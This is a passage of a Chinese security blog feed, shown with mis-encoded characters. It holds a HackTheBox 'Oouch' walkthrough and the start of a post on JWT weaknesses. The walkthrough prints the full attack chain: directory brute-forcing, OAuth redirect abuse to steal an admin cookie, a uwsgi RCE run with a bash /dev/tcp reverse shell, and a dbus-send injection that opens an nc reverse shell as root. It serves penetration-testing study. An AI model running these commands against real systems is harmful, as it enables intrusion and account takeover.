register</li><li>ä¸€ä¸ªè·¯ç”± /api/get_user å¦å¤–/oauth/authorize æ”¯æŒgetè¯·æ±‚</li><li>ä¼¼ä¹å¯ä»¥æœ‰é€”å¾„å¯ä»¥å¾—åˆ°sshkey</li></ul><p>çœ‹æ¥æ¥ä¸‹æ¥è¦è½¬æˆ˜8000ç«¯å£çš„<code>authorization.oouch.htb</code>äº†ã€‚<br>é¦–å…ˆä½œä¸ºæ™®é€šç”¨æˆ·ï¼Œ8000ç«¯å£é»˜è®¤çš„ä¸¤ä¸ªè·¯ç”±éƒ½æ²¡æœ‰åŠæ³•ä½¿ç”¨ã€‚é‚£ä¹ˆç°åœ¨å…ˆæƒ³åŠæ³•ç”¨ä¸Šæˆ‘ä»¬ä¹‹å‰å¾—åˆ°çš„ç”¨æˆ·å¯†ç ã€‚</p><p>æ¥ç€çˆ†ç ´</p><pre><code>wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://authorization.oouch.htb:8000/FUZZ   --hc 404 -t 80wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://authorization.oouch.htb:8000/oauth/FUZZ   --hc 404 -t 80</code></pre><p>ç¬¬ä¸€ä¸ªæ— æœã€‚ç¬¬äºŒä¸ªå‘ç°å­˜åœ¨<code>/application</code>ä¹Ÿå°±æ˜¯å¯ä»¥è®¿é—®<code>/oauth/application</code><br>ç„¶è€Œéœ€è¦ç”¨æˆ·å¯†ç ã€‚æˆ‘ä»¬ä¹‹å‰çš„è´¦æˆ·å¯†ç ä¹Ÿä¸è¡Œã€‚è¿™æ—¶ä»”ç»†è¿‡ä¸€édocument.å‘ç°è¯´è¿™ä¸ªè´¦æˆ·å¯†ç æ˜¯æœ‰æ³¨å†ŒåŠŸèƒ½çš„ï¼Œé‚£å°±è¯•è¯•<code>/oauth/application/register</code>å¹¶è¾“å…¥è´¦æˆ·å¯†ç </p><p><img src="/2020/07/01/hackthebox-Oouch/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æˆåŠŸäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±æœ‰äº†å¦ä¸€ä¸ªæœ‰æ•ˆçš„authorization appäº†ã€‚<br>æˆ‘è®¾ç½®çš„ä¿¡æ¯å¦‚ä¸‹</p><pre><code class="bash">http://authorization.oouch.htb:8000/oauth/applications/2/clientid cHYVFErrrGQAm6Q1iWEfgT0hgf2KX4SIecLnNCKgclientsecret 1QWQrnwCzUIiU8tB4BywB3p9Ca8umJGaSzoxJraanOwv7duBX3UnZN4n1VYMzLOrnrXh7OzLNhHF7qPv1UufuY8fIkNLDoPDSaUC2JGqKVeKb9oJZJweVHeFCgku6kqzClient type publicAuthorization Grant Type client-credentialsredirect uri  http://10.10.14.46/</code></pre><p>æ ¹æ®ä¹‹å‰çš„ssrfï¼Œæˆ‘ä»¬ä¼¼ä¹æœ‰åŠæ³•èƒ½å¤Ÿé€šè¿‡æœ€åçš„ä¸€ä¸ªuriå®Œæˆxssçš„æ”»å‡»ã€‚ä¹Ÿå°±æ˜¯æ‰“åˆ°adminçš„cookieã€‚é‚£ä¹ˆå¦‚ä½•åˆæ³•çš„æ„é€ ä¸€ä¸ªurlä½¿å¾—ç›´æ¥getè®¿é—®å°±èƒ½é‡å®šå‘å‘¢ï¼Ÿè¿™é‡Œå°±æ¶‰åŠåˆ°ä¸€äº›oauthçš„çŸ¥è¯†<br><a href="https://developers.facebook.com/docs/instagram-basic-display-api/reference/oauth-authorize/" target="_blank" rel="noopener">oauth-authorize</a></p><pre><code>#facebookGET https://api.instagram.com/oauth/authorize  ?client_id={app-id},  &amp;redirect_uri={redirect-uri},  &amp;response_type=code,  &amp;scope={scope}#twitterPOST /oauth2/token HTTP/1.1Host: api.twitter.comUser-Agent: My Twitter App v1.0.23Authorization: Basic eHZ6MWV2R ... o4OERSZHlPZw==Content-Type: application/x-www-form-urlencoded;charset=UTF-8Content-Length: 29Accept-Encoding: gzipgrant_type=client_credentials</code></pre><p>ä¸Šé¢ä¸¤ä¸ªåˆ†åˆ«æ˜¯facebookè·Ÿtwitterçš„oauthapiçš„å¼€å‘è€…æ–‡æ¡£é‡Œæ‰¾çš„ä¾‹å­ã€‚è™½ç„¶å„å®¶éƒ½æœ‰ä¸åŒï¼Œä½†æ˜¯å¤§æ¦‚çš„é‚£å‡ ä¸ªå‚æ•°ä¹Ÿæ˜¯èƒ½ç†è§£çš„ã€‚åŠ ä¸Šä¹‹å‰documenté‡Œè¯´<code>oauth/authorize</code>æ”¯æŒgetè¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å¯ä»¥æŒ‰ç…§è‡ªå·±çš„appåŠŸèƒ½ï¼Œæ„é€ ä¸€ä¸ªæ¶æ„çš„urlï¼Œé‡å®šå‘åˆ°æˆ‘ä»¬è‡ªå·±è¿™ã€‚<br>å…ˆåƒself-xssä¸€æ ·å¾€è‡ªå·±è¿™æ‰“ä¸€å‘<br>urlçš„å„ä¸ªå‚æ•°éƒ½è¦ä¸ä¹‹å‰æ³¨å†Œçš„appçš„å€¼å®Œå…¨ä¸€è‡´ã€‚å…¶ä¸­response_typeä¸ºcodeæ˜¯oauthæ ‡å‡†å›ºå®šçš„ã€‚</p><pre><code>http://authorization.oouch.htb:8000/oauth/authorize/?client_id=cHYVFErrrGQAm6Q1iWEfgT0hgf2KX4SIecLnNCKg&amp;redirect_uri=http://10.10.14.46/&amp;response_type=code&amp;grant_type=anthorization_code&amp;client_secret=1QWQrnwCzUIiU8tB4BywB3p9Ca8umJGaSzoxJraanOwv7duBX3UnZN4n1VYMzLOrnrXh7OzLNhHF7qPv1UufuY8fIkNLDoPDSaUC2JGqKVeKb9oJZJweVHeFCgku6kqz</code></pre><p>ç›´æ¥æµè§ˆå™¨è®¿é—®è¿™ä¸ªurl,ä¼šè¿›å…¥åˆ°authorizeçš„ä¸­é—´å±‚ã€‚ç‚¹ä¸‹authorizeå°±èƒ½åœ¨æœ¬æœºæ”¶åˆ°è¯·æ±‚<br><img src="/2020/07/01/hackthebox-Oouch/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‚£ä¹ˆç›´æ¥åˆ©ç”¨ä¹‹å‰çš„<code>contact</code>å¤„ssrfå³å¯å®Œæˆcookieçš„ç›—å–ã€‚</p><p><img src="/2020/07/01/hackthebox-Oouch/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™é‡Œæ¯”è¾ƒç‹—çš„æ˜¯å¿…é¡»å»æ‰<code>response_type</code>è¿™ä¸ªè¯·æ±‚å‚æ•°ï¼Œæ‰èƒ½å®Œæˆé‡å®šå‘ã€‚åŸç†å…¶å®ä¸Šé¢è§£é‡Šè¿‡äº†ï¼Œå› ä¸ºä¸€ä¸ªæœ‰æ•ˆçš„è¯·æ±‚å¿…é¡»ç»è¿‡æ‰‹åŠ¨çš„authorizationç¡®è®¤æ‰èƒ½å®Œæˆé‡å®šå‘ã€‚å¦‚æœæ˜¯ä¸€ä¸ªä¸æœ‰æ•ˆçš„urlåˆ™ä¼šåœ¨æˆæƒä¹‹å‰å°±é‡å®šå‘ã€‚åŸºäºæ­¤å¤„åªèƒ½å‘ä¸€ä¸ªè¯·æ±‚ã€‚æˆ‘ä»¬åªèƒ½é€šè¿‡ä¸€ä¸ªæ— æ•ˆresponse_typeå®Œæˆé‡å®šå‘ã€‚</p><p><img src="/2020/07/01/hackthebox-Oouch/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¾—åˆ°cookieåæ›´æ¢ã€‚æ¥ä¸‹æ¥å°è¯•è®¿é—®<code>oauth/token</code></p><p><a href="https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/" target="_blank" rel="noopener">https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/</a><br>ä¸Šé¢æ˜¯oauthå®˜æ–¹æ–‡æ¡£çš„ï¼Œé€šè¿‡oauth/tokenè·å–ä¸€ä¸ªaccess_tokenå†…å®¹ã€‚æˆ‘ä»¬å‚ç…§æ ¼å¼å‘åŒ…å³å¯(æ³¨æ„è¿™é‡Œgrant_typeçš„å€¼ä¸æˆ‘ä»¬åˆå§‹çš„appä¸ä¸€æ ·ã€‚æ‰€ä»¥è¦ç”¨ä¹‹å‰çš„è´¦æˆ·æ›´æ”¹è¿™ä¸€é€‰é¡¹)<br><img src="/2020/07/01/hackthebox-Oouch/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥ç”¨å¾—åˆ°çš„access_token è®¿é—®å”¯ä¸€æ²¡ç”¨ä¸Šçš„/api/get_user?access_token=xxxx.<br>å‘ç°è¿”å›userçš„jsonä¿¡æ¯ã€‚ç„¶åå°±å¡ä½äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚è¿™æ—¶æƒ³èµ·æ¥å‰é¢è¿˜æç¤ºè¯´æœ‰è·å–sshkeyçš„æ–¹æ³•ã€‚äºæ˜¯æŠŠuseræ¢æˆssh</p><p><img src="/2020/07/01/hackthebox-Oouch/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‹¿åˆ°keyåç»ˆäºå¯ä»¥ç™»é™†è¿™å°é¶æœºæ‹¿åˆ°user.txtäº†ã€‚</p><p>å°ç»“ä¸‹ã€‚ç¬¬ä¸€éƒ¨åˆ†ææ€•éš¾åº¦æ¯”å¸¸è§„çš„htbwebéƒ¨åˆ†è¦éš¾çš„å¤šã€‚å› ä¸ºæ¶‰åŠäº†å¤§é‡æ–°çŸ¥è¯†ä»¥åŠæƒé™é—®é¢˜ï¼ŒåŒæ—¶ç½‘ç«™ä¸çŸ¥é“ä¸ºä»€ä¹ˆç»å¸¸500ã€‚ä¸è¿‡oauthçš„å­˜åœ¨ä¹Ÿè®©æˆ‘é‡æ–°ä½“ä¼šåˆ°äº†è¶Šæƒçš„è®¸å¤šæ–°å¯èƒ½ã€‚æœ€åçš„sshæ€»è§‰å¾—æœ‰ç‚¹è„‘æ´äº†ã€‚</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>sshç™»å½•åå…ˆçœ‹åˆ°ç›®å½•ä¸‹æœ‰ä¸ªæç¤º.note.txt</p><pre><code>Implementing an IPS using DBus and iptables == Genius?</code></pre><p>Dbusä¼¼ä¹æ˜¯çªç ´å£ã€‚ä½†æ˜¯æˆ‘çš„äº†è§£ä»…é™äºçŸ¥é“Dbusæ˜¯å·¥æ§é‡Œç»å¸¸å‡ºç°çš„åè®®ã€‚<br>ç„¶ålinpeas.shæ‰«ä¸€éã€‚å‘ç°æ²¡æœ‰ä»€ä¹ˆæœ‰æ„æ€çš„æ–‡ä»¶ã€‚å› ä¸ºä¸¤ä¸ªpythonæœåŠ¡éƒ½æ˜¯ç”¨dockerè·‘çš„ã€‚<br>åŒæ—¶www-dataè·‘ç€uwsgi.<br><img src="/2020/07/01/hackthebox-Oouch/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œé¦–å…ˆé—®é¢˜æ˜¯æˆ‘ä»¬ä½œä¸ºérootç”¨æˆ·å¦‚ä½•è¿›å…¥dockerã€‚ä¸ç„¶æœ‰æ•ˆä¿¡æ¯å®åœ¨å¤ªå°‘äº†ã€‚è¯•äº†å¾ˆä¹…å‘ç°å¯ä»¥ç›´æ¥ç”¨sshç™»å½•è¿›docker???</p><p>å½“ç„¶ã€‚åªæœ‰Flaskçš„dockeræ˜¯å¯ä»¥ç”¨sshç™»å½•çš„ã€‚ç™»å½•è¿›å»åå…ˆçœ‹æ–‡ä»¶æºç ã€‚åœ¨å…¶ä¸­ä¸€ä¸ªæ‰¾åˆ°<br><img src="/2020/07/01/hackthebox-Oouch/12.PNG" class="lazyload" data-srcset="12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‡Œé¢æåˆ°äº†Dbusçš„interfaceä¹Ÿå°±æ˜¯æ¥å£ã€‚åç§°å«åš<code>htb.oouch.Blcok</code>ã€‚å¹¶ä¸”åé¢è°ƒç”¨äº†Blockæ–¹æ³•ã€‚</p><p>å¦ä¸€è¾¹åœ¨oouchæœ¬æœºä¸Šæ‰¾dbusç›¸å…³é…ç½®ã€‚åœ¨<code>/etc/dbus-1/system.d</code>å‘ç°configæ–‡ä»¶<br><img src="/2020/07/01/hackthebox-Oouch/13.PNG" class="lazyload" data-srcset="13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!-- -*- XML -*- --&gt;&lt;!DOCTYPE busconfig PUBLIC &quot;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&quot; &quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&quot;&gt;&lt;busconfig&gt;    &lt;policy user=&quot;root&quot;&gt;        &lt;allow own=&quot;htb.oouch.Block&quot;/&gt;    &lt;/policy&gt;        &lt;policy user=&quot;www-data&quot;&gt;                &lt;allow send_destination=&quot;htb.oouch.Block&quot;/&gt;                &lt;allow receive_sender=&quot;htb.oouch.Block&quot;/&gt;        &lt;/policy&gt;&lt;/busconfig&gt;</code></pre><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œrootç¡®å®æ˜¯å¯ä»¥åˆ©ç”¨dbusè¿›è¡Œé€šä¿¡çš„ã€‚ä½†åªæœ‰www-dataå¯ä»¥è¿›è¡Œæ”¶å‘æ¶ˆæ¯é€šä¿¡ã€‚é‚£ä¹ˆä¸‹é¢çš„è¦åŠ¡æ˜¯è·å–www-dataçš„æƒé™ã€‚</p><p>è¿™é‡Œå…¶å®å¹¶ä¸éš¾ã€‚å› ä¸ºæˆ‘ä»¬ä¹‹å‰å·²ç»å‘ç°è¿‡ï¼Œwww-dataæ˜¯è·‘ç€uwsgiçš„ã€‚è€Œpythonçš„uwsgiå¯ä»¥è§¦å‘RCEä¼¼ä¹åœ¨å‡ å¹´å‰çš„RWCTFä¸­å°±å‡ºç°è¿‡ã€‚(è¿™æ˜¯çœ‹CTF is awesome ä¸­å¬åˆ°youtuberæåˆ°çš„) </p><p>æ‰€ä»¥ä¸»è¦å°±éº»çƒ¦åœ¨æŠŠexpä¼ è¿‡å»ã€‚è¿™é‡Œä½¿ç”¨scpæ¯”è¾ƒæ–¹ä¾¿ã€‚å› ä¸ºdockerå®¹å™¨é‡Œå•¥éƒ½æ²¡æœ‰.<br>æ£€æŸ¥ä¸‹socketæ–‡ä»¶ä½ç½®ï¼Œäºæ˜¯åœ¨dockerçš„webæºç å¤„æ‰¾åˆ°uwsgi.iniæ–‡ä»¶</p><pre><code class="bash">qtc@aeb4525789d8:/code$ cat uwsgi.ini [uwsgi]module = oouch:appuid = www-datagid = www-datamaster = trueprocesses = 10socket = /tmp/uwsgi.socketchmod-sock = 777vacuum = truedie-on-term = true</code></pre><p><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py" target="_blank" rel="noopener">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py</a><br>uwsgiçš„è„šæœ¬ä¼ å¥½<br>è¿è¡Œè„šæœ¬ï¼Œæ¥ä¸‹æ¥qtcå¤„ncæ¥å—å³å¯</p><pre><code>python rce.py  -m unix -u /tmp/uwsgi.socket -c &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/172.18.0.1/9001 0&gt;&amp;1&#39;&quot;</code></pre><p><img src="/2020/07/01/hackthebox-Oouch/14.PNG" class="lazyload" data-srcset="14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œä¼¼ä¹è„šæœ¬æœ‰ä¸ªå°é—®é¢˜ï¼Œä¸è¿‡æŠŠæŠ¥é”™çš„ä½ç½®æ”¹ä¸‹å°±å¥½ã€‚</p><p>ç„¶åæœ¬æ¥åº”è¯¥å¾ˆå¿«è§£å†³çš„www-dataè·Ÿrooté€šä¿¡é—®é¢˜å›°æ‰°äº†æˆ‘å¥½ä¹…ã€‚é¦–å…ˆä¼ ä¸€ä¸ªncåˆ°dockeré‡Œé¢ç›‘å¬ï¼Œç„¶åç”¨åˆšåˆšdockerçš„www-dataçš„shellä¼ ä¸‹é¢è¿™ä¸ªpayload</p><pre><code>dbus-send --system  --print-reply --dest=htb.oouch.Block  htb/oouch/Block  htb.oouch.Block.Block &quot;string:; rm /tmp/f ; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 172.18.0.3 6666 &gt;/tmp/f;&quot;</code></pre><p>æŒ‰ç†è¯´åº”è¯¥æˆçš„ï¼Œç»“æœå¡äº†å¥½ä¹…ã€‚ä¸ºæ­¤ç‰¹æ„ä¸Šç½‘æ‰¾wpç»“æœå‘ç°æ˜¯å‡ ä¹ä¸€æ ·çš„payloadã€‚åŠ ä¸Šæˆ‘åˆä¸æ‡‚dbusï¼Œæ‰€ä»¥å°±åªå¥½æç½®äº†ã€‚ç»“æœç¬¬äºŒå¤©å†è¯•äº†ä¸‹å°±æˆäº†â€¦â€¦ä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºæˆ‘ä¼ äº†ä¸ªoouchè‡ªå·±çš„ncåˆ°dockeré‡Œé¢çš„ç¼˜æ•…ã€‚æ€»ä¹‹å¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥ä¸æƒ³å†å¤ç°äº†ã€‚<br><img src="/2020/07/01/hackthebox-Oouch/15.PNG" class="lazyload" data-srcset="15.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>è¿™å°é¶æœºä¸»è¦ä»·å€¼åœ¨äºå‰é¢get useréƒ¨åˆ†éå¸¸è´´è¿‘å®æˆ˜ã€‚æˆ‘è§‰å¾—æ˜¯æœ‰å¾ˆé«˜å­¦ä¹ ä»·å€¼çš„ã€‚å…³äºoauthçš„çŸ¥è¯†ä¹‹åæœ€å¥½å»äº†è§£ä¸‹ï¼Œå¯¹æˆæƒè¿™å—æœ¬åº”è¯¥å±äºé‡ç‚¹çš„å®‰å…¨é—®é¢˜èƒ½æœ‰æ–°çš„è®¤è¯†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Make jwt great again</title>
      <link href="2020/06/24/Make-jwt-great-again/"/>
      <url>2020/06/24/Make-jwt-great-again/</url>
      
        <content type="html"><![CDATA[<p>jwtï¼Œå…¨ç§°json-web-token.å…¶å®‰å…¨é—®é¢˜ä¸€ç›´ä»¥æ¥ä¼—æ‰€å‘¨çŸ¥ã€‚CTFä¸­ä¹Ÿç»å¸¸æ€§çš„ä¼šå‡ºç°ç›¸å…³çš„jwtä¼ªé€ çš„é¢˜ç›®ã€‚ä½†æ˜¯ä¹‹å‰åœ¨æ‰“äº†åœºNahamconCTFçš„æ¯”èµ›åï¼Œå¯¹jwtåˆæœ‰äº†å…¨æ–°çš„è®¤è¯†ã€‚å› æ­¤åœ¨è¿™é‡Œå…¨é¢çš„è§£é‡Šä¸‹jwtçš„ç›¸å…³æ¼æ´ã€‚Letâ€™s make jwt great again :)</p><a id="more"></a><h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><blockquote><p>JWTçš„å…¨ç§° Json Web Tokenã€‚å®ƒéµå¾ªJSONæ ¼å¼ï¼Œå°†ç”¨æˆ·ä¿¡æ¯åŠ å¯†åˆ°tokené‡Œï¼ŒæœåŠ¡å™¨ä¸ä¿å­˜ä»»ä½•ç”¨æˆ·ä¿¡æ¯ï¼Œåªä¿å­˜å¯†é’¥ä¿¡æ¯ï¼Œé€šè¿‡ä½¿ç”¨ç‰¹å®šåŠ å¯†ç®—æ³•éªŒè¯tokenï¼Œé€šè¿‡tokenéªŒè¯ç”¨æˆ·èº«ä»½ã€‚åŸºäºtokençš„èº«ä»½éªŒè¯å¯ä»¥æ›¿ä»£ä¼ ç»Ÿçš„cookie+sessionèº«ä»½éªŒè¯æ–¹æ³•</p></blockquote><p>å…¶æ ¼å¼ä¹Ÿéå¸¸æ¸…æ™°<br><code>header.payload.signature</code><br>ç”±ä¸‰æ®µå¼ç»„æˆã€‚</p><p>è¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œflaskçš„sessionç”Ÿæˆæ ¼å¼ä¹ŸåŒæ ·æ˜¯ä¸‰æ®µå¼ã€‚æœ‰ä¸€å®šçš„å¼‚æ›²åŒå·¥ä¹‹å¤„ã€‚ä½†æ˜¯ä¸åŒäºjwtã€‚å…¶ä¼ªé€ æ–¹å¼å¾€å¾€éå¸¸å±€é™ã€‚</p><p>ä¸‹é¢ç®€å•è°ˆä¸‹ä¸‰ä¸ªéƒ¨åˆ†ç»“æ„</p><ul><li>header<br>ä¸€ä¸ªç®€å•çš„headeræ˜¯è¿™ç§å½¢å¼çš„<pre><code class="json">{      &quot;alg&quot; : &quot;HS256&quot;,      &quot;typ&quot; : &quot;jwt&quot;}</code></pre></li></ul><p>ä½†æ˜¯å®é™…ä¸Šjwtçš„headerè¿˜æ”¯æŒåŠ å…¥å…¶å®ƒå‡ ä¸ªå±æ€§ã€‚<br><code>kid,jwk......</code><br>å…¶å…·ä½“å«ä¹‰å°†åœ¨åé¢æåŠã€‚</p><ul><li>payload<pre><code class="json">{  &quot;user_role&quot; : &quot;finn&quot;,    //å½“å‰ç™»å½•ç”¨æˆ·  &quot;iss&quot;: &quot;admin&quot;,          //è¯¥JWTçš„ç­¾å‘è€…  &quot;iat&quot;: 1573440582,        //ç­¾å‘æ—¶é—´  &quot;exp&quot;: 1573940267,        //è¿‡æœŸæ—¶é—´  &quot;nbf&quot;: 1573440582,         //è¯¥æ—¶é—´ä¹‹å‰ä¸æ¥æ”¶å¤„ç†è¯¥Token  &quot;domain&quot;: &quot;example.com&quot;,   //é¢å‘çš„ç”¨æˆ·  &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   //Tokenå”¯ä¸€æ ‡è¯†}</code></pre>å…¶ä¸­å¤§éƒ¨åˆ†å˜é‡éƒ½æ˜¯å¯ä»¥é€‰æ‹©æ€§ç”Ÿæˆçš„ã€‚æœ‰çš„è¯­è¨€çš„jwtåº“ä¼šè‡ªåŠ¨ç”Ÿæˆiatå˜é‡ï¼Œä½†æ˜¯è¿™äº›éƒ½æ— ä¼¤å¤§é›…ã€‚å¾€å¾€æœ€é‡è¦çš„ï¼Œæ˜¯å½“payloadå­˜å‚¨äº†è‡ªå®šä¹‰çš„æ•æ„Ÿä¿¡æ¯æ—¶ã€‚æ¯”å¦‚usernameä¹‹ç±»çš„ã€‚</li></ul><p>ç”±äºjwtå­˜å‚¨ä¿¡æ¯æ—¶ï¼Œheader+payloadçš„jsonæ•°æ®æ˜¯ç›´æ¥é€šè¿‡base64è¿›è¡Œç¼–ç å­˜å‚¨çš„ã€‚å› æ­¤æˆ‘ä»¬ä¸€å®šå¯ä»¥ä»payloadä¸­å‘ç°<strong>ä¿¡æ¯æ³„éœ²</strong>ã€‚</p><p>ä½†æ˜¯ä»æ¼æ´åˆ©ç”¨è§’åº¦æ¥è®²ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦è¾¾æˆè¶Šæƒçš„ç›®çš„ï¼Œå°±å¿…é¡»å¾—æåˆ°å…¶signatureéƒ¨åˆ†ã€‚</p><ul><li>Signature</li></ul><p>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯é€šè¿‡å‰é¢æŒ‡å®šçš„ç®—æ³•ï¼Œå»ç”Ÿæˆå¯¹åº”çš„sig.<br>è¿™é‡Œæˆ‘ä»¥HS256ä¸ºä¾‹ï¼Œä»ä¼ªä»£ç çš„è§’åº¦è®²ã€‚æ˜¯è¿™æ ·ç”Ÿæˆçš„</p><pre><code class="python">key = &#39;secretkey&#39;  unsignedToken = encodeBase64(header) + &#39;.&#39; + encodeBase64(payload)  signature = HMAC-SHA256(key, unsignedToken)</code></pre><p>å¯è§ï¼Œå…¶æ€è·¯å°±æ˜¯ç”¨<code>HMAC-sha256</code>ï¼ˆå¯¹ç§°åŠ å¯†ç®—æ³•ï¼‰ï¼Œå¯¹jwtå‰ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆçš„å­—ç¬¦ä¸²è¿›è¡ŒåŠ 